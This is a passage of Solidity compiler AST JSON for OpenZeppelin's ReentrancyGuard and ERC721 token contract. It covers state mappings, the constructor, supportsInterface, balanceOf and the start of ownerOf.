pure"}},"id":37,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2460:63:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":38,"nodeType":"ExpressionStatement","src":"2460:63:0"},{"expression":{"id":41,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":39,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":10,"src":"2598:7:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":40,"name":"_ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":8,"src":"2608:8:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2598:18:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":42,"nodeType":"ExpressionStatement","src":"2598:18:0"}]},"id":44,"implemented":true,"kind":"function","modifiers":[],"name":"_nonReentrantBefore","nameLocation":"2345:19:0","nodeType":"FunctionDefinition","parameters":{"id":30,"nodeType":"ParameterList","parameters":[],"src":"2364:2:0"},"returnParameters":{"id":31,"nodeType":"ParameterList","parameters":[],"src":"2375:0:0"},"scope":53,"src":"2336:287:0","stateMutability":"nonpayable","virtual":false,"visibility":"private"},{"body":{"id":51,"nodeType":"Block","src":"2667:171:0","statements":[{"expression":{"id":49,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":47,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":10,"src":"2809:7:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":48,"name":"_NOT_ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5,"src":"2819:12:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2809:22:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":50,"nodeType":"ExpressionStatement","src":"2809:22:0"}]},"id":52,"implemented":true,"kind":"function","modifiers":[],"name":"_nonReentrantAfter","nameLocation":"2638:18:0","nodeType":"FunctionDefinition","parameters":{"id":45,"nodeType":"ParameterList","parameters":[],"src":"2656:2:0"},"returnParameters":{"id":46,"nodeType":"ParameterList","parameters":[],"src":"2667:0:0"},"scope":53,"src":"2629:209:0","stateMutability":"nonpayable","virtual":false,"visibility":"private"}],"scope":54,"src":"888:1952:0","usedErrors":[]}],"src":"112:2729:0"},"id":0},"@openzeppelin/contracts/token/ERC721/ERC721.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/token/ERC721/ERC721.sol","exportedSymbols":{"Address":[1489],"Context":[1511],"ERC165":[1710],"ERC721":[998],"IERC165":[1722],"IERC721":[1114],"IERC721Metadata":[1159],"IERC721Receiver":[1132],"Math":[2587],"Strings":[1686]},"id":999,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":55,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"107:23:1"},{"absolutePath":"@openzeppelin/contracts/token/ERC721/IERC721.sol","file":"./IERC721.sol","id":56,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":999,"sourceUnit":1115,"src":"132:23:1","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol","file":"./IERC721Receiver.sol","id":57,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":999,"sourceUnit":1133,"src":"156:31:1","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol","file":"./extensions/IERC721Metadata.sol","id":58,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":999,"sourceUnit":1160,"src":"188:42:1","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/Address.sol","file":"../../utils/Address.sol","id":59,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":999,"sourceUnit":1490,"src":"231:33:1","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/Context.sol","file":"../../utils/Context.sol","id":60,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":999,"sourceUnit":1512,"src":"265:33:1","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/Strings.sol","file":"../../utils/Strings.sol","id":61,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":999,"sourceUnit":1687,"src":"299:33:1","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/introspection/ERC165.sol","file":"../../utils/introspection/ERC165.sol","id":62,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":999,"sourceUnit":1711,"src":"333:46:1","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":64,"name":"Context","nodeType":"IdentifierPath","referencedDeclaration":1511,"src":"647:7:1"},"id":65,"nodeType":"InheritanceSpecifier","src":"647:7:1"},{"baseName":{"id":66,"name":"ERC165","nodeType":"IdentifierPath","referencedDeclaration":1710,"src":"656:6:1"},"id":67,"nodeType":"InheritanceSpecifier","src":"656:6:1"},{"baseName":{"id":68,"name":"IERC721","nodeType":"IdentifierPath","referencedDeclaration":1114,"src":"664:7:1"},"id":69,"nodeType":"InheritanceSpecifier","src":"664:7:1"},{"baseName":{"id":70,"name":"IERC721Metadata","nodeType":"IdentifierPath","referencedDeclaration":1159,"src":"673:15:1"},"id":71,"nodeType":"InheritanceSpecifier","src":"673:15:1"}],"contractDependencies":[],"contractKind":"contract","documentation":{"id":63,"nodeType":"StructuredDocumentation","src":"381:246:1","text":" @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\n the Metadata extension, but not including the Enumerable extension, which is available separately as\n {ERC721Enumerable}."},"fullyImplemented":true,"id":998,"linearizedBaseContracts":[998,1159,1114,1710,1722,1511],"name":"ERC721","nameLocation":"637:6:1","nodeType":"ContractDefinition","nodes":[{"id":74,"libraryName":{"id":72,"name":"Address","nodeType":"IdentifierPath","referencedDeclaration":1489,"src":"701:7:1"},"nodeType":"UsingForDirective","src":"695:26:1","typeName":{"id":73,"name":"address","nodeType":"ElementaryTypeName","src":"713:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}},{"id":77,"libraryName":{"id":75,"name":"Strings","nodeType":"IdentifierPath","referencedDeclaration":1686,"src":"732:7:1"},"nodeType":"UsingForDirective","src":"726:26:1","typeName":{"id":76,"name":"uint256","nodeType":"ElementaryTypeName","src":"744:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}},{"constant":false,"id":79,"mutability":"mutable","name":"_name","nameLocation":"791:5:1","nodeType":"VariableDeclaration","scope":998,"src":"776:20:1","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string"},"typeName":{"id":78,"name":"string","nodeType":"ElementaryTypeName","src":"776:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"private"},{"constant":false,"id":81,"mutability":"mutable","name":"_symbol","nameLocation":"838:7:1","nodeType":"VariableDeclaration","scope":998,"src":"823:22:1","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string"},"typeName":{"id":80,"name":"string","nodeType":"ElementaryTypeName","src":"823:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"private"},{"constant":false,"id":85,"mutability":"mutable","name":"_owners","nameLocation":"934:7:1","nodeType":"VariableDeclaration","scope":998,"src":"898:43:1","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"},"typeName":{"id":84,"keyType":{"id":82,"name":"uint256","nodeType":"ElementaryTypeName","src":"906:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Mapping","src":"898:27:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"},"valueType":{"id":83,"name":"address","nodeType":"ElementaryTypeName","src":"917:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}},"visibility":"private"},{"constant":false,"id":89,"mutability":"mutable","name":"_balances","nameLocation":"1028:9:1","nodeType":"VariableDeclaration","scope":998,"src":"992:45:1","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"typeName":{"id":88,"keyType":{"id":86,"name":"address","nodeType":"ElementaryTypeName","src":"1000:7:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"992:27:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"valueType":{"id":87,"name":"uint256","nodeType":"ElementaryTypeName","src":"1011:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}},"visibility":"private"},{"constant":false,"id":93,"mutability":"mutable","name":"_tokenApprovals","nameLocation":"1129:15:1","nodeType":"VariableDeclaration","scope":998,"src":"1093:51:1","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"},"typeName":{"id":92,"keyType":{"id":90,"name":"uint256","nodeType":"ElementaryTypeName","src":"1101:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Mapping","src":"1093:27:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"},"valueType":{"id":91,"name":"address","nodeType":"ElementaryTypeName","src":"1112:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}},"visibility":"private"},{"constant":false,"id":99,"mutability":"mutable","name":"_operatorApprovals","nameLocation":"1252:18:1","nodeType":"VariableDeclaration","scope":998,"src":"1199:71:1","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_address_$_t_bool_$_$","typeString":"mapping(address => mapping(address => bool))"},"typeName":{"id":98,"keyType":{"id":94,"name":"address","nodeType":"ElementaryTypeName","src":"1207:7:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"1199:44:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_address_$_t_bool_$_$","typeString":"mapping(address => mapping(address => bool))"},"valueType":{"id":97,"keyType":{"id":95,"name":"address","nodeType":"ElementaryTypeName","src":"1226:7:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"1218:24:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_bool_$","typeString":"mapping(address => bool)"},"valueType":{"id":96,"name":"bool","nodeType":"ElementaryTypeName","src":"1237:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}}},"visibility":"private"},{"body":{"id":115,"nodeType":"Block","src":"1446:57:1","statements":[{"expression":{"id":109,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":107,"name":"_name","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":79,"src":"1456:5:1","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":108,"name":"name_","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":102,"src":"1464:5:1","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"src":"1456:13:1","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"id":110,"nodeType":"ExpressionStatement","src":"1456:13:1"},{"expression":{"id":113,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":111,"name":"_symbol","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":81,"src":"1479:7:1","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":112,"name":"symbol_","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":104,"src":"1489:7:1","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"src":"1479:17:1","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"id":114,"nodeType":"ExpressionStatement","src":"1479:17:1"}]},"documentation":{"id":100,"nodeType":"StructuredDocumentation","src":"1277:108:1","text":" @dev Initializes the contract by setting a `name` and a `symbol` to the token collection."},"id":116,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":105,"nodeType":"ParameterList","parameters":[{"constant":false,"id":102,"mutability":"mutable","name":"name_","nameLocation":"1416:5:1","nodeType":"VariableDeclaration","scope":116,"src":"1402:19:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":101,"name":"string","nodeType":"ElementaryTypeName","src":"1402:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":104,"mutability":"mutable","name":"symbol_","nameLocation":"1437:7:1","nodeType":"VariableDeclaration","scope":116,"src":"1423:21:1","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":103,"name":"string","nodeType":"ElementaryTypeName","src":"1423:6:1","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"1401:44:1"},"returnParameters":{"id":106,"nodeType":"ParameterList","parameters":[],"src":"1446:0:1"},"scope":998,"src":"1390:113:1","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"baseFunctions":[1709,1721],"body":{"id":146,"nodeType":"Block","src":"1678:192:1","statements":[{"expression":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":144,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":139,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"id":132,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":127,"name":"interfaceId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":119,"src":"1707:11:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"arguments":[{"id":129,"name":"IERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1114,"src":"1727:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IERC721_$1114_$","typeString":"type(contract IERC721)"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_contract$_IERC721_$1114_$","typeString":"type(contract IERC721)"}],"id":128,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"1722:4:1","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":130,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1722:13:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_contract$_IERC721_$1114","typeString":"type(contract IERC721)"}},"id":131,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"interfaceId","nodeType":"MemberAccess","src":"1722:25:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"src":"1707:40:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"commonType":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"id":138,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":133,"name":"interfaceId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":119,"src":"1763:11:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"arguments":[{"id":135,"name":"IERC721Metadata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1159,"src":"1783:15:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IERC721Metadata_$1159_$","typeString":"type(contract IERC721Metadata)"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_contract$_IERC721Metadata_$1159_$","typeString":"type(contract IERC721Metadata)"}],"id":134,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"1778:4:1","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":136,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1778:21:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_contract$_IERC721Metadata_$1159","typeString":"type(contract IERC721Metadata)"}},"id":137,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"interfaceId","nodeType":"MemberAccess","src":"1778:33:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"src":"1763:48:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"1707:104:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"arguments":[{"id":142,"name":"interfaceId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":119,"src":"1851:11:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes4","typeString":"bytes4"}],"expression":{"id":140,"name":"super","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-25,"src":"1827:5:1","typeDescriptions":{"typeIdentifier":"t_type$_t_super$_ERC721_$998_$","typeString":"type(contract super ERC721)"}},"id":141,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"supportsInterface","nodeType":"MemberAccess","referencedDeclaration":1709,"src":"1827:23:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_bytes4_$returns$_t_bool_$","typeString":"function (bytes4) view returns (bool)"}},"id":143,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1827:36:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"1707:156:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":126,"id":145,"nodeType":"Return","src":"1688:175:1"}]},"documentation":{"id":117,"nodeType":"StructuredDocumentation","src":"1509:56:1","text":" @dev See {IERC165-supportsInterface}."},"functionSelector":"01ffc9a7","id":147,"implemented":true,"kind":"function","modifiers":[],"name":"supportsInterface","nameLocation":"1579:17:1","nodeType":"FunctionDefinition","overrides":{"id":123,"nodeType":"OverrideSpecifier","overrides":[{"id":121,"name":"ERC165","nodeType":"IdentifierPath","referencedDeclaration":1710,"src":"1646:6:1"},{"id":122,"name":"IERC165","nodeType":"IdentifierPath","referencedDeclaration":1722,"src":"1654:7:1"}],"src":"1637:25:1"},"parameters":{"id":120,"nodeType":"ParameterList","parameters":[{"constant":false,"id":119,"mutability":"mutable","name":"interfaceId","nameLocation":"1604:11:1","nodeType":"VariableDeclaration","scope":147,"src":"1597:18:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"typeName":{"id":118,"name":"bytes4","nodeType":"ElementaryTypeName","src":"1597:6:1","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"visibility":"internal"}],"src":"1596:20:1"},"returnParameters":{"id":126,"nodeType":"ParameterList","parameters":[{"constant":false,"id":125,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":147,"src":"1672:4:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":124,"name":"bool","nodeType":"ElementaryTypeName","src":"1672:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"1671:6:1"},"scope":998,"src":"1570:300:1","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[1039],"body":{"id":170,"nodeType":"Block","src":"2010:123:1","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":162,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":157,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":150,"src":"2028:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[{"hexValue":"30","id":160,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2045:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":159,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2037:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":158,"name":"address","nodeType":"ElementaryTypeName","src":"2037:7:1","typeDescriptions":{}}},"id":161,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2037:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"2028:19:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a2061646472657373207a65726f206973206e6f7420612076616c6964206f776e6572","id":163,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2049:43:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159","typeString":"literal_string \"ERC721: address zero is not a valid owner\""},"value":"ERC721: address zero is not a valid owner"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159","typeString":"literal_string \"ERC721: address zero is not a valid owner\""}],"id":156,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"2020:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":164,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2020:73:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":165,"nodeType":"ExpressionStatement","src":"2020:73:1"},{"expression":{"baseExpression":{"id":166,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":89,"src":"2110:9:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":168,"indexExpression":{"id":167,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":150,"src":"2120:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"2110:16:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":155,"id":169,"nodeType":"Return","src":"2103:23:1"}]},"documentation":{"id":148,"nodeType":"StructuredDocumentation","src":"1876:48:1","text":" @dev See {IERC721-balanceOf}."},"functionSelector":"70a08231","id":171,"implemented":true,"kind":"function","modifiers":[],"name":"balanceOf","nameLocation":"1938:9:1","nodeType":"FunctionDefinition","overrides":{"id":152,"nodeType":"OverrideSpecifier","overrides":[],"src":"1983:8:1"},"parameters":{"id":151,"nodeType":"ParameterList","parameters":[{"constant":false,"id":150,"mutability":"mutable","name":"owner","nameLocation":"1956:5:1","nodeType":"VariableDeclaration","scope":171,"src":"1948:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":149,"name":"address","nodeType":"ElementaryTypeName","src":"1948:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1947:15:1"},"returnParameters":{"id":155,"nodeType":"ParameterList","parameters":[{"constant":false,"id":154,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":171,"src":"2001:7:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":153,"name":"uint256","nodeType":"ElementaryTypeName","src":"2001:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2000:9:1"},"scope":998,"src":"1929:204:1","stateMutability":"view","virtual":true,"visibility":"public"},{"baseFunctions":[1047],"body":{"id":198,"nodeType":"Block","src":"2271:138:1","statements":[{"assignments":[181],"declarations":[{"constant":false,"id":181,"mutability":"mutable","name":"owner","nameLocation":"2289:5:1","nodeType":"VariableDeclaration","scope":198,"src":"2281:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":180,"name":"address","nodeType":"ElementaryTypeName","src":"2281:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"id":185,"initialValue":{"arguments":[{"id":183,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":174,"src":"2306:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":182,"name":"_ownerOf","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":481,"src":"2297:8:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":184,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2297:17:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"VariableDeclarationStatement","src":"2281:33:1"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":192,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":187,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":181,"src":"2332:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[{"hexValue":"30","id":190,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2349:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":189,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2341:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":188,"name":"address","nodeType":"ElementaryTypeName","src":"2341:7:1","typeDescriptions":{}}},"id":191,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2341:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"2332:19:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a20696e76616c696420746f6b656e204944","id":193,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2353:26:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","typeString":"literal_string \"ERC721: invalid token ID\""},"value":"ERC721: invalid token ID"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","typeString":"literal_string \"ERC721: invalid token 